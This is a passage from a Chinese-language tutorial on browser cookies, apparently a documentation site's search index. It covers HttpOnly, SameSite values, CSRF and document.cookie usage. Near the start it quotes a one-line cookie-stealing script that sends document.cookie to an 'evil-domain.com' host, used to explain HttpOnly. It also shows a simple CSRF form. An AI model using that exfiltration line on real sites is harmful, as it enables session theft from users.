\u5bf9\u8c61\u548c Request API \u90fd\u62ff\u4e0d\u5230\u8be5\u5c5e\u6027\u3002\u8fd9\u6837\u5c31\u9632\u6b62\u4e86\u8be5 Cookie \u88ab\u811a\u672c\u8bfb\u5230\uff0c\u53ea\u6709\u6d4f\u89c8\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u65f6\uff0c\u624d\u4f1a\u5e26\u4e0a\u8be5 Cookie\u3002 1 ( new Image ()). src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document . cookie ; \u4e0a\u9762\u662f\u8de8\u7ad9\u70b9\u8f7d\u5165\u7684\u4e00\u4e2a\u6076\u610f\u811a\u672c\u7684\u4ee3\u7801\uff0c\u80fd\u591f\u5c06\u5f53\u524d\u7f51\u9875\u7684 Cookie \u53d1\u5f80\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u3002\u5982\u679c\u8bbe\u7f6e\u4e86\u4e00\u4e2a Cookie \u7684 HttpOnly \u5c5e\u6027\uff0c\u4e0a\u9762\u4ee3\u7801\u5c31\u4e0d\u4f1a\u8bfb\u5230\u8be5 Cookie\u3002 SameSite \u00b6 Chrome 51 \u5f00\u59cb\uff0c\u6d4f\u89c8\u5668\u7684 Cookie \u65b0\u589e\u52a0\u4e86\u4e00\u4e2a SameSite \u5c5e\u6027\uff0c\u7528\u6765\u9632\u6b62 CSRF \u653b\u51fb\u548c\u7528\u6237\u8ffd\u8e2a\u3002 Cookie \u5f80\u5f80\u7528\u6765\u5b58\u50a8\u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f\uff0c\u6076\u610f\u7f51\u7ad9\u53ef\u4ee5\u8bbe\u6cd5\u4f2a\u9020\u5e26\u6709\u6b63\u786e Cookie \u7684 HTTP \u8bf7\u6c42\uff0c\u8fd9\u5c31\u662f CSRF \u653b\u51fb\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7528\u6237\u767b\u9646\u4e86\u94f6\u884c\u7f51\u7ad9 your-bank.com \uff0c\u94f6\u884c\u670d\u52a1\u5668\u53d1\u6765\u4e86\u4e00\u4e2a Cookie\u3002 1 Set-Cookie:id=a3fWa; \u7528\u6237\u540e\u6765\u53c8\u8bbf\u95ee\u4e86\u6076\u610f\u7f51\u7ad9 malicious.com \uff0c\u4e0a\u9762\u6709\u4e00\u4e2a\u8868\u5355\u3002 1 2 3 < form action = \"your-bank.com/transfer\" method = \"POST\" > ... </ form > \u7528\u6237\u4e00\u65e6\u88ab\u8bf1\u9a97\u53d1\u9001\u8fd9\u4e2a\u8868\u5355\uff0c\u94f6\u884c\u7f51\u7ad9\u5c31\u4f1a\u6536\u5230\u5e26\u6709\u6b63\u786e Cookie \u7684\u8bf7\u6c42\u3002\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u653b\u51fb\uff0c\u5b98\u7f51\u7684\u8868\u5355\u4e00\u822c\u90fd\u5e26\u6709\u4e00\u4e2a\u968f\u673a token\uff0c\u5b98\u7f51\u670d\u52a1\u5668\u901a\u8fc7\u9a8c\u8bc1\u8fd9\u4e2a\u968f\u673a token\uff0c\u786e\u8ba4\u662f\u5426\u4e3a\u771f\u5b9e\u8bf7\u6c42\u3002 1 2 3 4 < form action = \"your-bank.com/transfer\" method = \"POST\" > < input type = \"hidden\" name = \"token\" value = \"dad3weg34\" > ... </ form > \u8fd9\u79cd\u7b2c\u4e09\u65b9\u7f51\u7ad9\u5f15\u5bfc\u800c\u9644\u5e26\u53d1\u9001\u7684 Cookie\uff0c\u5c31\u79f0\u4e3a\u7b2c\u4e09\u65b9 Cookie\u3002\u5b83\u9664\u4e86\u7528\u4e8e CSRF \u653b\u51fb\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u7528\u6237\u8ffd\u8e2a\u3002\u6bd4\u5982\uff0cFacebook \u5728\u7b2c\u4e09\u65b9\u7f51\u7ad9\u63d2\u5165\u4e00\u5f20\u770b\u4e0d\u89c1\u7684\u56fe\u7247\u3002 1 < img src = \"facebook.com\" style = \"visibility:hidden;\" > \u6d4f\u89c8\u5668\u52a0\u8f7d\u4e0a\u9762\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5411 Facebook \u53d1\u51fa\u5e26\u6709 Cookie \u7684\u8bf7\u6c42\uff0c\u4ece\u800c Facebook \u5c31\u4f1a\u77e5\u9053\u4f60\u662f\u8c01\uff0c\u8bbf\u95ee\u4e86\u4ec0\u4e48\u7f51\u7ad9\u3002 Cookie \u7684 SameSite \u5c5e\u6027\u7528\u6765\u9650\u5236\u7b2c\u4e09\u65b9 Cookie\uff0c\u4ece\u800c\u51cf\u5c11\u5b89\u5168\u98ce\u9669\u3002\u5b83\u53ef\u4ee5\u8bbe\u7f6e\u4e09\u4e2a\u503c\u3002 Strict Lax None \uff081\uff09Strict Strict \u6700\u4e3a\u4e25\u683c\uff0c\u5b8c\u5168\u7981\u6b62\u7b2c\u4e09\u65b9 Cookie\uff0c\u8de8\u7ad9\u70b9\u65f6\uff0c\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4e0d\u4f1a\u53d1\u9001 Cookie\u3002\u6362\u8a00\u4e4b\uff0c\u53ea\u6709\u5f53\u524d\u7f51\u9875\u7684 URL \u4e0e\u8bf7\u6c42\u76ee\u6807\u4e00\u81f4\uff0c\u624d\u4f1a\u5e26\u4e0a Cookie\u3002 1 Set-Cookie: CookieName=CookieValue; SameSite=Strict; \u8fd9\u4e2a\u89c4\u5219\u8fc7\u4e8e\u4e25\u683c\uff0c\u53ef\u80fd\u9020\u6210\u975e\u5e38\u4e0d\u597d\u7684\u7528\u6237\u4f53\u9a8c\u3002\u6bd4\u5982\uff0c\u5f53\u524d\u7f51\u9875\u6709\u4e00\u4e2a GitHub \u94fe\u63a5\uff0c\u7528\u6237\u70b9\u51fb\u8df3\u8f6c\u5c31\u4e0d\u4f1a\u5e26\u6709 GitHub \u7684 Cookie\uff0c\u8df3\u8f6c\u8fc7\u53bb\u603b\u662f\u672a\u767b\u9646\u72b6\u6001\u3002 \uff082\uff09Lax Lax \u89c4\u5219\u7a0d\u7a0d\u653e\u5bbd\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e5f\u662f\u4e0d\u53d1\u9001\u7b2c\u4e09\u65b9 Cookie\uff0c\u4f46\u662f\u5bfc\u822a\u5230\u76ee\u6807\u7f51\u5740\u7684 Get \u8bf7\u6c42\u9664\u5916\u3002 1 Set-Cookie: CookieName=CookieValue; SameSite=Lax; \u5bfc\u822a\u5230\u76ee\u6807\u7f51\u5740\u7684 GET \u8bf7\u6c42\uff0c\u53ea\u5305\u62ec\u4e09\u79cd\u60c5\u51b5\uff1a\u94fe\u63a5\uff0c\u9884\u52a0\u8f7d\u8bf7\u6c42\uff0cGET \u8868\u5355\u3002\u8be6\u89c1\u4e0b\u8868\u3002 \u8bf7\u6c42\u7c7b\u578b \u793a\u4f8b \u6b63\u5e38\u60c5\u51b5 Lax \u94fe\u63a5 <a href=\"...\"></a> \u53d1\u9001 Cookie \u53d1\u9001 Cookie \u9884\u52a0\u8f7d <link rel=\"prerender\" href=\"...\"/> \u53d1\u9001 Cookie \u53d1\u9001 Cookie GET \u8868\u5355 <form method=\"GET\" action=\"...\"> \u53d1\u9001 Cookie \u53d1\u9001 Cookie POST \u8868\u5355 <form method=\"POST\" action=\"...\"> \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 iframe <iframe src=\"...\"></iframe> \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 AJAX $.get(\"...\") \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 Image <img src=\"...\"> \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 \u8bbe\u7f6e\u4e86 Strict \u6216 Lax \u4ee5\u540e\uff0c\u57fa\u672c\u5c31\u675c\u7edd\u4e86 CSRF \u653b\u51fb\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u7528\u6237\u6d4f\u89c8\u5668\u652f\u6301 SameSite \u5c5e\u6027\u3002 \uff083\uff09None Chrome \u8ba1\u5212\u5c06 Lax \u53d8\u4e3a\u9ed8\u8ba4\u8bbe\u7f6e\u3002\u8fd9\u65f6\uff0c\u7f51\u7ad9\u53ef\u4ee5\u9009\u62e9\u663e\u5f0f\u5173\u95ed SameSite \u5c5e\u6027\uff0c\u5c06\u5176\u8bbe\u4e3a None \u3002\u4e0d\u8fc7\uff0c\u524d\u63d0\u662f\u5fc5\u987b\u540c\u65f6\u8bbe\u7f6e Secure \u5c5e\u6027\uff08Cookie \u53ea\u80fd\u901a\u8fc7 HTTPS \u534f\u8bae\u53d1\u9001\uff09\uff0c\u5426\u5219\u65e0\u6548\u3002 \u4e0b\u9762\u7684\u8bbe\u7f6e\u65e0\u6548\u3002 1 Set-Cookie: widget_session=abc123; SameSite=None \u4e0b\u9762\u7684\u8bbe\u7f6e\u6709\u6548\u3002 1 Set-Cookie: widget_session=abc123; SameSite=None; Secure document.cookie \u00b6 document.cookie \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u5f53\u524d\u7f51\u9875\u7684 Cookie\u3002 \u8bfb\u53d6\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u8fd4\u56de\u5f53\u524d\u7f51\u9875\u7684\u6240\u6709 Cookie\uff0c\u524d\u63d0\u662f\u8be5 Cookie \u4e0d\u80fd\u6709 HTTPOnly \u5c5e\u6027\u3002 1 document . cookie // \"foo=bar;baz=bar\" \u4e0a\u9762\u4ee3\u7801\u4ece document.cookie \u4e00\u6b21\u6027\u8bfb\u51fa\u4e24\u4e2a Cookie\uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u5206\u53f7\u5206\u9694\u3002\u5fc5\u987b\u624b\u52a8\u8fd8\u539f\uff0c\u624d\u80fd\u53d6\u51fa\u6bcf\u4e00\u4e2a Cookie \u7684\u503c\u3002 1 2 3 4 5 6 7 var cookies = document . cookie . split ( ';' ); for ( var i = 0 ; i < cookies . length ; i ++ ) { console . log ( cookies [ i ]); } // foo=bar // baz=bar document.cookie \u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b83\u4e3a\u5f53\u524d\u7f51\u7ad9\u6dfb\u52a0 Cookie\u3002 1 document . cookie = 'fontSize=14' ; \u5199\u5165\u7684\u65f6\u5019\uff0cCookie \u7684\u503c\u5fc5\u987b\u5199\u6210 key=value \u7684\u5f62\u5f0f\u3002\u6ce8\u610f\uff0c\u7b49\u53f7\u4e24\u8fb9\u4e0d\u80fd\u6709\u7a7a\u683c\u3002\u53e6\u5916\uff0c\u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u5fc5\u987b\u5bf9\u5206\u53f7\u3001\u9017\u53f7\u548c\u7a7a\u683c\u8fdb\u884c\u8f6c\u4e49\uff08\u5b83\u4eec\u90fd\u4e0d\u5141\u8bb8\u4f5c\u4e3a Cookie \u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u7528 encodeURIComponent \u65b9\u6cd5\u8fbe\u5230\u3002 \u4f46\u662f\uff0c document.cookie \u4e00\u6b21\u53ea\u80fd\u5199\u5165\u4e00\u4e2a Cookie\uff0c\u800c\u4e14\u5199\u5165\u5e76\u4e0d\u662f\u8986\u76d6\uff0c\u800c\u662f\u6dfb\u52a0\u3002 1 2 3 4 document . cookie = 'test1=hello' ; document . cookie = 'test2=world' ; document . cookie // test1=hello;test2=world document.cookie \u8bfb\u5199\u884c\u4e3a\u7684\u5dee\u5f02\uff08\u4e00\u6b21\u53ef\u4ee5\u8bfb\u51fa\u5168\u90e8 Cookie\uff0c\u4f46\u662f\u53ea\u80fd\u5199\u5165\u4e00\u4e2a Cookie\uff09\uff0c\u4e0e HTTP \u534f\u8bae\u7684 Cookie \u901a\u4fe1\u683c\u5f0f\u6709\u5173\u3002\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001 Cookie \u7684\u65f6\u5019\uff0c Cookie \u5b57\u6bb5\u662f\u4f7f\u7528\u4e00\u884c\u5c06\u6240\u6709 Cookie \u5168\u90e8\u53d1\u9001\uff1b\u670d\u52a1\u5668\u5411\u6d4f\u89c8\u5668\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff0c Set-Cookie \u5b57\u6bb5\u662f\u4e00\u884c\u8bbe\u7f6e\u4e00\u4e2a Cookie\u3002 \u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4e00\u8d77\u5199\u5165 Cookie \u7684\u5c5e\u6027\u3002 1 document . cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\" ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u540c\u65f6\u8bbe\u7f6e\u4e86 expires \u5c5e\u6027\u3002\u5c5e\u6027\u503c\u7684\u7b49\u53f7\u4e24\u8fb9\uff0c\u4e5f\u662f\u4e0d\u80fd\u6709\u7a7a\u683c\u7684\u3002 \u5404\u4e2a\u5c5e\u6027\u7684\u5199\u5165\u6ce8\u610f\u70b9\u5982\u4e0b\u3002 path \u5c5e\u6027\u5fc5\u987b\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u9ed8\u8ba4\u4e3a\u5f53\u524d\u8def\u5f84\u3002 domain \u5c5e\u6027\u503c\u5fc5\u987b\u662f\u5f53\u524d\u53d1\u9001 Cookie \u7684\u57df\u540d\u7684\u4e00\u90e8\u5206\u3002\u6bd4\u5982\uff0c\u5f53\u524d\u57df\u540d\u662f example.com \uff0c\u5c31\u4e0d\u80fd\u5c06\u5176\u8bbe\u4e3a foo.com \u3002\u8be5\u5c5e\u6027\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7684\u4e00\u7ea7\u57df\u540d\uff08\u4e0d\u542b\u4e8c\u7ea7\u57df\u540d\uff09\u3002 max-age \u5c5e\u6027\u7684\u503c\u4e3a\u79d2\u6570\u3002 expires \u5c5e\u6027\u7684\u503c\u4e3a UTC \u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528 Date.prototype.toUTCString() \u8fdb\u884c\u65e5\u671f\u683c\u5f0f\u8f6c\u6362\u3002 document.cookie \u5199\u5165 Cookie \u7684\u4f8b\u5b50\u5982\u4e0b\u3002 1 2 3 4 document . cookie = 'fontSize=14; ' + 'expires=' + someDate . toGMTString () + '; ' + 'path=/subdirectory; ' + 'domain=*.example.com' ; Cookie \u7684\u5c5e\u6027\u4e00\u65e6\u8bbe\u7f6e\u5b8c\u6210\uff0c\u5c31\u6ca1\u6709\u529e\u6cd5\u8bfb\u53d6\u8fd9\u4e9b\u5c5e\u6027\u7684\u503c\u3002 \u5220\u9664\u4e00\u4e2a\u73b0\u5b58 Cookie \u7684\u552f\u4e00\u65b9\u6cd5\uff0c\u662f\u8bbe\u7f6e\u5b83\u7684 expires \u5c5e\u6027\u4e3a\u4e00\u4e2a\u8fc7\u53bb\u7684\u65e5\u671f\u3002 1 document . cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540d\u4e3a fontSize \u7684 Cookie \u7684\u503c\u4e3a\u7a7a\uff0c\u8fc7\u671f\u65f6\u95f4\u8bbe\u4e3a1970\u5e741\u67081\u6708\u96f6\u70b9\uff0c\u5c31\u7b49\u540c\u4e8e\u5220\u9664\u4e86\u8fd9\u4e2a Cookie\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 HTTP cookies , by MDN Using the Same-Site Cookie Attribute to Prevent CSRF Attacks SameSite cookies explained Tough Cookies , Scott Helme Cross-Site Request Forgery is dead! , Scott Helme","title":"Cookie"},{"location":"bom/cookie/#cookie","text":"","title":"Cookie"},{"location":"bom/cookie/#_1","text":"Cookie \u662f\u670d\u52a1\u5668\u4fdd\u5b58\u5728\u6d4f\u89c8\u5668\u7684\u4e00\u5c0f\u6bb5\u6587\u672c\u4fe1\u606f\uff0c\u4e00\u822c\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc74KB\u3002\u6d4f\u89c8\u5668\u6bcf\u6b21\u5411\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\uff0c\u5c31\u4f1a\u81ea\u52a8\u9644\u4e0a\u8fd9\u6bb5\u4fe1\u606f\u3002 HTTP \u534f\u8bae\u4e0d\u5e26\u6709\u72b6\u6001\uff0c\u6709\u4e9b\u8bf7\u6c42\u9700\u8981\u533a\u5206\u72b6\u6001\uff0c\u5c31\u901a\u8fc7 Cookie \u9644\u5e26\u5b57\u7b26\u4e32\uff0c\u8ba9\u670d\u52a1\u5668\u8fd4\u56de\u4e0d\u4e00\u6837\u7684\u56de\u5e94\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7528\u6237\u767b\u5f55\u4ee5\u540e\uff0c\u670d\u52a1\u5668\u5f80\u5f80\u4f1a\u5728\u7f51\u7ad9\u4e0a\u7559\u4e0b\u4e00\u4e2a Cookie\uff0c\u8bb0\u5f55\u7528\u6237\u7f16\u53f7\uff08\u6bd4\u5982 id=1234 \uff09\uff0c\u4ee5\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u6570\u636e\uff0c\u5c31\u4f1a\u5e26\u4e0a\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u670d\u52a1\u5668\u4ece\u800c\u77e5\u9053\u662f\u8c01\u5728\u8bf7\u6c42\uff0c\u5e94\u8be5\u56de\u5e94\u4ec0\u4e48\u5185\u5bb9\u3002 Cookie \u7684\u76ee\u7684\u5c31\u662f\u533a\u5206\u7528\u6237\uff0c\u4ee5\u53ca\u653e\u7f6e\u72b6\u6001\u4fe1\u606f\uff0c\u5b83\u7684\u4f7f\u7528\u573a\u666f\u4e3b\u8981\u5982\u4e0b\u3002 \u5bf9\u8bdd\uff08session\uff09\u7ba1\u7406\uff1a\u4fdd\u5b58\u767b\u5f55\u72b6\u6001\u3001\u8d2d\u7269\u8f66\u7b49\u9700\u8981\u8bb0\u5f55\u7684\u4fe1\u606f\u3002 \u4e2a\u6027\u5316\u4fe1\u606f\uff1a\u4fdd\u5b58\u7528\u6237\u7684\u504f\u597d\uff0c\u6bd4\u5982\u7f51\u9875\u7684\u5b57\u4f53\u5927\u5c0f\u3001\u80cc\u666f\u8272\u7b49\u7b49\u3002 \u8ffd\u8e2a\u7528\u6237\uff1a\u8bb0\u5f55\u548c\u5206\u6790\u7528\u6237\u884c\u4e3a\u3002 Cookie \u4e0d\u662f\u4e00\u79cd\u7406\u60f3\u7684\u5ba2\u6237\u7aef\u5b58\u50a8\u673a\u5236\u3002\u5b83\u7684\u5bb9\u91cf\u5f88\u5c0f\uff084KB\uff09\uff0c\u7f3a\u4e4f\u6570\u636e\u64cd\u4f5c\u63a5\u53e3\uff0c\u800c\u4e14\u4f1a\u5f71\u54cd\u6027\u80fd\u3002\u5ba2\u6237\u7aef\u5b58\u50a8\u5efa\u8bae\u4f7f\u7528 Web storage API \u548c IndexedDB\u3002\u53ea\u6709\u90a3\u4e9b\u6bcf\u6b21\u8bf7\u6c42\u90fd\u9700\u8981\u8ba9\u670d\u52a1\u5668\u77e5\u9053\u7684\u4fe1\u606f\uff0c\u624d\u5e94\u8be5\u653e\u5728 Cookie \u91cc\u9762\u3002 \u6bcf\u4e2a Cookie \u90fd\u6709\u4ee5\u4e0b\u51e0\u65b9\u9762\u7684\u5143\u6570\u636e\u3002 Cookie \u7684\u540d\u5b57 Cookie \u7684\u503c\uff08\u771f\u6b63\u7684\u6570\u636e\u5199\u5728\u8fd9\u91cc\u9762\uff09 \u5230\u671f\u65f6\u95f4\uff08\u8d85\u8fc7\u8fd9\u4e2a\u65f6\u95f4\u4f1a\u5931\u6548\uff09 \u6240\u5c5e\u57df\u540d\uff08\u9ed8\u8ba4\u4e3a\u5f53\u524d\u57df\u540d\uff09 \u751f\u6548\u7684\u8def\u5f84\uff08\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7f51\u5740\uff09 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u7528\u6237\u8bbf\u95ee\u7f51\u5740 www.example.com \uff0c\u670d\u52a1\u5668\u5728\u6d4f\u89c8\u5668\u5199\u5165\u4e00\u4e2a Cookie\u3002\u8fd9\u4e2a Cookie \u7684\u6240\u5c5e\u57df\u540d\u4e3a www.example.com \uff0c\u751f\u6548\u8def\u5f84\u4e3a\u6839\u8def\u5f84 / \u3002 \u5982\u679c Cookie \u7684\u751f\u6548\u8def\u5f84\u8bbe\u4e3a /forums \uff0c\u90a3\u4e48\u8fd9\u4e2a Cookie \u53ea\u6709\u5728\u8bbf\u95ee www.example.com/forums \u53ca\u5176\u5b50\u8def\u5f84\u65f6\u624d\u6709\u6548\u3002\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\u67d0\u4e2a\u8def\u5f84\u4e4b\u524d\uff0c\u5c31\u4f1a\u627e\u51fa\u5bf9\u8be5\u57df\u540d\u548c\u8def\u5f84\u6709\u6548\uff0c\u5e76\u4e14\u8fd8\u6ca1\u6709\u5230\u671f\u7684 Cookie\uff0c\u4e00\u8d77\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002 \u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u6d4f\u89c8\u5668\u4e0d\u63a5\u53d7 Cookie\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e0d\u5411\u670d\u52a1\u5668\u53d1\u9001 Cookie\u3002 window.navigator.cookieEnabled \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u6253\u5f00 Cookie \u529f\u80fd\u3002 1 window . navigator . cookieEnabled // true document.cookie \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u7f51\u9875\u7684 Cookie\u3002 1 document . cookie // \"id=foo;key=bar\" \u4e0d\u540c\u6d4f\u89c8\u5668\u5bf9 Cookie \u6570\u91cf\u548c\u5927\u5c0f\u7684\u9650\u5236\uff0c\u662f\u4e0d\u4e00\u6837\u7684\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5355\u4e2a\u57df\u540d\u8bbe\u7f6e\u7684 Cookie \u4e0d\u5e94\u8d85\u8fc730\u4e2a\uff0c\u6bcf\u4e2a Cookie \u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc7 4KB\u3002\u8d85\u8fc7\u9650\u5236\u4ee5\u540e\uff0cCookie \u5c06\u88ab\u5ffd\u7565\uff0c\u4e0d\u4f1a\u88ab\u8bbe\u7f6e\u3002 Cookie \u662f\u6309\u7167\u57df\u540d\u533a\u5206\u7684\uff0c foo.com \u53ea\u80fd\u8bfb\u53d6\u81ea\u5df1\u653e\u7f6e\u7684 Cookie\uff0c\u65e0\u6cd5\u8bfb\u53d6\u5176\u4ed6\u7f51\u7ad9\uff08\u6bd4\u5982 bar.com \uff09\u653e\u7f6e\u7684 Cookie\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e00\u7ea7\u57df\u540d\u4e5f\u4e0d\u80fd\u8bfb\u53d6\u4e8c\u7ea7\u57df\u540d\u7559\u4e0b\u7684 Cookie\uff0c\u6bd4\u5982 mydomain.com \u4e0d\u80fd\u8bfb\u53d6 subdomain.mydomain.com \u8bbe\u7f6e\u7684 Cookie\u3002\u4f46\u662f\u6709\u4e00\u4e2a\u4f8b\u5916\uff0c\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff08\u4e0d\u7ba1\u662f\u4e00\u7ea7\u57df\u540d\u8bbe\u7f6e\u7684\uff0c\u8fd8\u662f\u4e8c\u7ea7\u57df\u540d\u8bbe\u7f6e\u7684\uff09\uff0c\u660e\u786e\u5c06 domain \u5c5e\u6027\u8bbe\u4e3a\u4e00\u7ea7\u57df\u540d\uff0c\u5219\u8fd9\u4e2a\u57df\u540d\u4e0b\u9762\u7684\u5404\u7ea7\u57df\u540d\u53ef\u4ee5\u5171\u4eab\u8fd9\u4e2a Cookie\u3002 1 Set-Cookie: name=value; domain=mydomain.com \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u8bbe\u7f6e Cookie \u65f6\uff0c domain \u5c5e\u6027\u8bbe\u4e3a mydomain.com \uff0c\u90a3\u4e48\u5404\u7ea7\u7684\u5b50\u57df\u540d\u548c\u4e00\u7ea7\u57df\u540d\u90fd\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e2a Cookie\u3002 \u6ce8\u610f\uff0c\u533a\u5206 Cookie \u65f6\u4e0d\u8003\u8651\u534f\u8bae\u548c\u7aef\u53e3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c http://example.com \u8bbe\u7f6e\u7684 Cookie\uff0c\u53ef\u4ee5\u88ab https://example.com \u6216 http://example.com:8080 \u8bfb\u53d6\u3002","title":"\u6982\u8ff0"},{"location":"bom/cookie/#cookie-http","text":"Cookie \u7531 HTTP \u534f\u8bae\u751f\u6210\uff0c\u4e5f\u4e3b\u8981\u662f\u4f9b HTTP \u534f\u8bae\u4f7f\u7528\u3002","title":"Cookie \u4e0e HTTP \u534f\u8bae"},{"location":"bom/cookie/#http-cookie","text":"\u670d\u52a1\u5668\u5982\u679c\u5e0c\u671b\u5728\u6d4f\u89c8\u5668\u4fdd\u5b58 Cookie\uff0c\u5c31\u8981\u5728 HTTP \u56de\u5e94\u7684\u5934\u4fe1\u606f\u91cc\u9762\uff0c\u653e\u7f6e\u4e00\u4e2a Set-Cookie \u5b57\u6bb5\u3002 1 Set-Cookie:foo=bar \u4e0a\u9762\u4ee3\u7801\u4f1a\u5728\u6d4f\u89c8\u5668\u4fdd\u5b58\u4e00\u4e2a\u540d\u4e3a foo \u7684 Cookie\uff0c\u5b83\u7684\u503c\u4e3a bar \u3002 HTTP \u56de\u5e94\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Set-Cookie \u5b57\u6bb5\uff0c\u5373\u5728\u6d4f\u89c8\u5668\u751f\u6210\u591a\u4e2a Cookie\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 HTTP / 1.0 200 OK Content-type : text/html Set-Cookie : yummy_cookie=choco Set-Cookie : tasty_cookie=strawberry [page content] \u9664\u4e86 Cookie \u7684\u503c\uff0c Set-Cookie \u5b57\u6bb5\u8fd8\u53ef\u4ee5\u9644\u52a0 Cookie \u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date> Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit> Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value> Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value> Set-Cookie: <cookie-name>=<cookie-value>; Secure Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly \u4e0a\u9762\u7684\u51e0\u4e2a\u5c5e\u6027\u7684\u542b\u4e49\uff0c\u5c06\u5728\u540e\u6587\u89e3\u91ca\u3002 \u4e00\u4e2a Set-Cookie \u5b57\u6bb5\u91cc\u9762\uff0c\u53ef\u4ee5\u540c\u65f6\u5305\u62ec\u591a\u4e2a\u5c5e\u6027\uff0c\u6ca1\u6709\u6b21\u5e8f\u7684\u8981\u6c42\u3002 1 Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly \u5982\u679c\u670d\u52a1\u5668\u60f3\u6539\u53d8\u4e00\u4e2a\u65e9\u5148\u8bbe\u7f6e\u7684 Cookie\uff0c\u5fc5\u987b\u540c\u65f6\u6ee1\u8db3\u56db\u4e2a\u6761\u4ef6\uff1aCookie \u7684 key \u3001 domain \u3001 path \u548c secure \u90fd\u5339\u914d\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u539f\u59cb\u7684 Cookie \u662f\u7528\u5982\u4e0b\u7684 Set-Cookie \u8bbe\u7f6e\u7684\u3002 1 Set-Cookie: key1=value1; domain=example.com; path=/blog \u6539\u53d8\u4e0a\u9762\u8fd9\u4e2a Cookie \u7684\u503c\uff0c\u5c31\u5fc5\u987b\u4f7f\u7528\u540c\u6837\u7684 Set-Cookie \u3002 1 Set-Cookie: key1=value2; domain=example.com; path=/blog \u53ea\u8981\u6709\u4e00\u4e2a\u5c5e\u6027\u4e0d\u540c\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u5168\u65b0\u7684 Cookie\uff0c\u800c\u4e0d\u662f\u66ff\u6362\u6389\u539f\u6765\u90a3\u4e2a Cookie\u3002 1 Set-Cookie: key1=value2; domain=example.com; path=/ \u4e0a\u9762\u7684\u547d\u4ee4\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u540c\u540d Cookie\uff0c\u4f46\u662f path \u5c5e\u6027\u4e0d\u4e00\u6837\u3002\u4e0b\u4e00\u6b21\u8bbf\u95ee example.com/blog \u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5c06\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e24\u4e2a\u540c\u540d\u7684 Cookie\u3002 1 Cookie: key1=value1; key1=value2 \u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u4e2a Cookie \u662f\u540c\u540d\u7684\uff0c\u5339\u914d\u8d8a\u7cbe\u786e\u7684 Cookie \u6392\u5728\u8d8a\u524d\u9762\u3002","title":"HTTP 